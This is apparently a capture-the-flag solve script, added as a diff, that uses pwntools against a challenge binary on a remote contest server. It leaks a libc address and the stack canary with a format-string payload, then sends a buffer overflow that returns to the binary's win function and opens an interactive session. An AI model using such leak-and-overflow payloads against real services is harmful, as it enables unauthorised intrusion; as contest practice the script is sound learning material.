@@ -1,0 +1,46 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+# while True:
+exe = ELF("./runway3e")
+# context.log_level='debug'
+# while True:
+p = remote("challs.pwnoh.io", 13403 )
+libc = ELF("./libc.so.6")
+# p = process([exe.path])
+def gdbs():
+    context.terminal = ["foot"]
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+
+# gdbs()
+# sla("?",f"%{0xe4e8}c%21$hn")
+# sl(f"%{(exe.sym.win+5)&0xffff}c%51$hn")
+sla("?",f"%11$plmao%13$p")
+p.recvline()
+addr = int(p.recvuntil("lmao",drop=True),16)
+libc.address = addr - 0x7f1aa
+log.info(f"libc: {hex(libc.address)}")
+canary = int(p.recvline(),16)
+log.info(f"canary: {hex(canary)}")
+sl(b"a"*40+p64(canary)+p64(0)+p64(exe.sym.win+5))
+
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
